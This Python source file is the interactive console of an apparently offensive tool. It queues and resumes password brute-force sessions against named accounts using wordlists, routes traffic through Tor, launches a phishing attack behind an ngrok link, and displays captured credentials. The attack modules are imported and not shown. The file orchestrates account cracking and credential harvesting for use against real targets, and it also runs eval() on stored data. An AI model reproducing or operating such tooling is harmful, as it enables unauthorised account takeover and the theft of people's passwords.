# Date: 12/15/2017
# -*- coding: utf-8 -*-
# Author: Ethical-H4CK3R
# Description: Interactive Console

import socket
from cmd2 import Cmd
from time import sleep
from queue import Queue
from tor import tor_stop
from banner import banner
from os.path import exists
from getpass import getuser
from subprocess import call
from session import Session
from lib.ngrok import Phish
from bruter import Bruteforce
from regulator import Regulate
from constants import database_path, colors, version, credentials, banners_tabs_amt as tabs

class Console(Cmd, object):

 def __init__(self): 
  super(Console, self).__init__()
  self.session_history = [] # delay lock out by only accept one session per account 

  self.ruler = '-'
  self.debug = True
  self.phishing_obj = None
  self.default_to_shell = True
  self.reset_socket = socket.socket
  self.doc_header = '\n{3}{0}Possible Commands {2}({2}type {1}help <{2}command{1}>{2})'.\
  format(colors['blue'], colors['yellow'], colors['white'], '\t'*tabs)
  self.intro = banner() + '\tversion: {0}({1}{2}{0}){1}β\n\t{1}type {0}help{1} for help\n'.\
  format(colors['yellow'], colors['white'], version)

  call('clear')
  self._sessions = Queue() # holds attack sessions
  self.prompt = '{}{}{}>{} '.\
  format(colors['red'], getuser(), colors['blue'], colors['white'])
 
 '''def _help_menu(self):
  """"Show a list of commands which help can be displayed for.
  """
  ignore = ['shell', '_relative_load', 'cmdenvironment', 'help', 'history', 'load',
            'edit', 'py', 'pyscript', 'set', 'show', 'save', 'shortcuts', 'run', 'unalias', 'alias']

  # get a list of all method names
  names = self.get_names()

  # remove any command names which are explicitly excluded from the help menu
  for name in self.exclude_from_help:
   names.remove(name)

  cmds_doc = []
  help_dict = {}
  for name in names:
   if name[:5] == 'help_':
    help_dict[name[5:]] = 1

  names.sort()
  prevname = ''

  for name in names:
   if name[:3] == 'do_':
    if name == prevname:
     continue

    prevname = name
    command = name[3:]

    if command in ignore:
     continue

    if command in help_dict:
     cmds_doc.append(command)
     del help_dict[command]
    elif getattr(self, name).__doc__:
     cmds_doc.append(command)
    else:pass

  self.print_topics(self.doc_header, cmds_doc, 15, 80)

 def print_topics(self, header, cmds, cmdlen, maxcol):
  if cmds:
   self.stdout.write("%s\n"%str(header))
   if self.ruler:
    self.stdout.write("+%s+\n"%str(self.ruler * (len(header))))
   self.columnize(cmds, maxcol-1)
   self.stdout.write("\n")'''

 def exit(self, exits=True):
  if exits:print '\n\t[!] Exiting ...'
  else:socket.socket = self.reset_socket
  for session in self._sessions.queue:session.stop()
  if self.phishing_obj:self.phishing_obj.stop()
  if not exits:sleep(1.5)
  tor_stop()

 def check_args(self, args, num):
  args = args.split()
  if len(args) != num:
   print '\n\t[-] Error: This Function takes {} arguments ({} given)\n'.\
   format(num, len(args))
   return

  index = args[0]
  new_data = args[1]

  if not index.isdigit():
   print '\n\tError: `{}` is not a number\n'.format(index)
   return

  index = int(index)
  if any([index >= len(self._sessions.queue), index < 0]):
   print '\n\tError: `{}` is not in the queue\n'.format(index)
   return
  return index, new_data

 def do_change_username(self, args):
  '''\n\tDescription: Change the username of a session that's within the queue
    \tUsage: change_username <id> <new_username>\n'''
  args = self.check_args(args, 2)
  if not args:return
  obj = self._sessions.queue[args[0]].obj
  del self.session_history[self.session_history.index(obj.username)]
  obj.username = args[1].title()
  self.session_history.append(obj.username)
  obj.session.username = obj.username

 def do_change_wordlist(self, args):
  '''\n\tDescription: Change the wordlist of a session that's within the queue & restart it
    \tUsage: change_wordlist <id> <new_wordlist>\n'''
  args = self.check_args(args, 2)
  if not args:return
  if not exists(args[1]):
   print '\n\tError: `{}` doesn\'t exists\n'
   return

  obj = self._sessions.queue[args[0]].obj
  restart = False if not obj.is_alive else True
  del self.session_history[self.session_history.index(obj.username)]
  obj.wordlist = args[1]
  self.session_history.append(obj.username)
  self._sessions.queue[args[0]].reset()
  obj.session.wordlist = obj.wordlist
  if restart:self.do_start(str(args[0]))

 def do_database(self, args):
  '''\n\tDescription: Display all saved sessions within the database
    \tUsage: database\n'''
  self.display_sessions()  

 def do_monitor(self, args):
  '''\n\tDescription: Monitor one or more sessions
    \tUsage: monitor <id>\n'''
  sessions = []
  if not args: return 

  for index in args:
   if not index.isdigit():continue
   index = int(index)
   if any([index >= len(self._sessions.queue), index < 0]):continue
   sessions.append(self._sessions.queue[index])

  while len(sessions):
   try:
    for session1, session2 in zip(sessions, [_ for _ in  reversed(sessions)]):
     session = list(set([session1, session2]))
     if any([session1.obj.is_alive, session2.obj.is_alive]):
      call('clear')
      if len(session) > 1:
       print '{}\n{}\n{}'.format(session[0].info, '='*(len(session1.obj.ip  
        if session1.obj.ip else '192.168.0.1')+14), session[1].info)
       sleep(1)
      elif len(session) == 1:
       print session[0].info 
       sleep(0.5)
      else:pass 
     else:
      if not session1.obj.is_alive:
       del sessions[sessions.index(session1)]
      elif not session2.obj.is_alive:
       del sessions[sessions.index(session2)]
      else:pass
   except KeyboardInterrupt:break

 def do_start(self, args, verbose=True):
  '''\n\tDescription: Start one session or more within the queue
    \tUsage: start <id>\n'''

  for index in args:
   if not index.isdigit():continue
   index = int(index)

   if any([index >= len(self._sessions.queue), index < 0]):continue
   if verbose:print '\n\tStarting: {} ...\n'.format(index)
   self._sessions.queue[index].start()
   sleep(0.5)

 def do_restart(self, args):
  '''\n\tDescription: Restart one session or more within the queue
    \tUsage: restart <id>\n'''

  for index in args:
   if not index.isdigit():continue
   index = int(index)

   if any([index >= len(self._sessions.queue), index < 0]):continue
   self._sessions.queue[index].reset()
   self.do_start(str(index))

 def do_stop(self, args):
  '''\n\tDescription: Stop one session or more within the queue
    \tUsage: stop <id>\n'''

  for index in args:
   if not index.isdigit():continue
   index = int(index)

   if any([index >= len(self._sessions.queue), index < 0]):continue
   print '\n\tStopping: {} ...\n'.format(index)
   self._sessions.queue[index].stop()
   sleep(0.5)

 def do_delete(self, index):
  '''\n\tDescription: Remove a session from the queue
    \tUsage: remove <id>\n '''

  if not len(index):return
  index = index.split()[0]

  if not index.isdigit():return 
  index = int(index)
   
  if any([index >= len(self._sessions.queue), index < 0]):return 
  obj = self._sessions.queue[index].obj

  del self.session_history[self.session_history.index(obj.username)]
  self._sessions.queue[index].stop()
  self._sessions.queue.pop(index)

 def do_remove(self, index):
  '''\n\tDescription: Remove a session from the database
    \tUsage: remove <id>\n '''
  
  if not len(index):return
  index = index.split()[0]

  if not index.isdigit():return 
  index = int(index)
   
  if any([index >= len(self._sessions.queue), index < 0]):return 
  obj = self._sessions.queue[index].obj

  del self.session_history[self.session_history.index(obj.username)]
  session = self._sessions.queue.pop(index)
  session.remove()
  sleep(0.1)

 def do_reset(self, args):
  '''\n\tDescription: Reset database, by deleting all saved sessions
    \tUsage: reset\n'''
  try:
   if raw_input('\n\tAre you sure you want remove EVERY session? [Y/n] ').lower() == 'y':
    self.delete_all()
    for session in self._sessions.queue:
     self._sessions.get()
     session.remove()
   print
  except:return

 def do_quit(self, args):
  '''\n\tDescription: Terminate the program
    \tUsage: quit OR exit\n'''
  self._should_quit = True
  return self._STOP_AND_EXIT

 def do_exit(self, args):
  '''\n\tDescription: Terminate the program
    \tUsage: quit OR exit\n'''
  self._should_quit = True
  return self._STOP_AND_EXIT

 def do_queue(self, args):
  '''\n\tDescription: Display the sessions within the queue
    \tUsage: queue\n'''
  for _, session in enumerate(self._sessions.queue):
   ID = '\n{0}[{1}ID{0}]{1}: {2}'.format(colors['yellow'], colors['white'], _)
   acv = '\nActive: {}{}{}'.format(colors['red'] if not session.obj.is_alive\
   else colors['blue'], session.obj.is_alive, colors['white'])

   attempts = '\nAttempts: {}{}{}'.format(colors['yellow'],
   session.obj.attempts, colors['white'])

   msg = session.obj.msg if session.obj.msg else ''

   print '{}{}{}{}\nSession: {}\n'.\
   format(ID, acv, attempts, msg, [_ for _ in session.simple_info])

 def do_create(self, args):
  '''\n\tDescription: Create a new session & append it into the queue
    \tUsage: create <username> <wordlist>\n'''
  if not args:return
  args = args.split()

  if len(args) != 2:
   print '\n\t[-] Error: This Function takes 2 arguments ({} given)\n'.format(len(args))
   return

  username = args[0].title()
  wordlist = args[1]

  if not exists(wordlist):
   print '\n\t[-] Error: Unable to locate `{}`\n'.format(wordlist)
   return

  bruter = Bruteforce(username, wordlist)
  ID = self.retrieve_ID(username, wordlist)
  if username in self.session_history:return 
  else:self.session_history.append(username)

  if ID:
   try:
    if raw_input('\n\tDo you want to use saved data? [Y/n] ').lower() == 'y':
     data = self.retrieve_data(ID)
     if data[-1]:
      bruter.passlist.queue = eval(data[-1])
     if data[-2]:
      bruter.retrieve = True
      bruter.attempts = eval(data[-2])
    else:
     self.delete(ID)
     ID = 0
   except:return

  bruter.session = Session(database_path, ID, username, wordlist)
  self._sessions.put(Regulate(bruter))
  if ID:print

 def do_recreate(self, args):
  '''\n\tDescription: Recreate one session or more from the database
    \tUsage: recreate <id>\n'''

  database = {}
  for num, session in enumerate(self.get_database()):
   database[num] = session

  for index in args:
   if not index.isdigit():continue
   if not int(index) in database:continue

   session = database[int(index)]
   ID = int(session[0])

   username = str(session[1])
   wordlist = str(session[2])

   attempts = session[3]
   passlist = eval(session[4]) if session[4] else []

   if username in self.session_history:return
   else:self.session_history.append(username)
   bruter = Bruteforce(username, wordlist)
   
   bruter.username = username
   bruter.wordlist = wordlist

   bruter.attempts = attempts
   bruter.passlist.queue = passlist

   bruter.session = Session(database_path, ID, username, wordlist)
   self._sessions.put(Regulate(bruter))

   print '\n\tRecreating {} ...\n'.format(index)
   sleep(1)
 
 def do_get_banner(self, args):
  '''\n\tDescription: Display a banner
    \tUsage: get_banner\n'''
  call('clear')
  print banner()

 def do_start_phish(self, args=None, rec=2):
  '''\n\tDescription: Start a phishing attack
    \tUsage: start_phish\n'''
  try:
   if self.phishing_obj:return
   if not args:print '\n\t[+] Starting social engineering attack ...\n'
   self.exit(False) # stop tor so we can access http://localhost:4040 for url
   self.phishing_obj = Phish()
   link = self.phishing_obj.start()
   if all([not link, not rec]):
    self.phishing_obj.stop()
    self.phishing_obj = None
    print '\n\t[!] Error: Phishing attack failed, try again in a while!\n'
   elif all([not link, rec]):
    self.phishing_obj.stop()
    self.phishing_obj = None
    self.do_start_phish(True, rec=rec-1)
   else:
    prompt = '{}{}{}>{} '.\
    format(colors['red'], getuser(), colors['blue'], colors['white'])
    self.prompt = '{0}[{1}{2}{0}]{3}'.\
    format(colors['yellow'], colors['green'], link, prompt)
  except:pass
  finally:self.do_start([str(_) for _ in range(self._sessions.qsize())], False)

 def do_stop_phish(self, args=None):
  '''\n\tDescription: Stop phishing attack
    \tUsage: stop_phish\n'''
  try:
   if not self.phishing_obj:return 
   if not args:print '\n\t[!] Stopping social engineering attack ...\n'
   self.phishing_obj.stop()
   self.phishing_obj = None
  except:pass 
  finally:
   self.prompt = '{}{}{}>{} '.\
  format(colors['red'], getuser(), colors['blue'], colors['white'])

 def do_restart_phish(self, args):
  '''\n\tDescription: Restart phishing attack
    \tUsage: restart_phish\n'''
  if self.phishing_obj:
   print '\n\t[+] Restarting social engineering attack ...\n'
   self.do_stop_phish(True)
  else:print '\n\t[+] Starting social engineering attack ...\n'
  self.do_start_phish(True)

 def do_capture_list(self, args):
  '''\n\tDescription: Display the capture list
    \tUsage: capture_list\n'''
  if exists(credentials):
   with open(credentials, 'rt') as f:
    newline = True
    for cred in f:
     try:
      print '{}\t{}'.format('\n' if newline else '', cred.replace('\n', ''))
      newline = False if newline else newline
     except:break
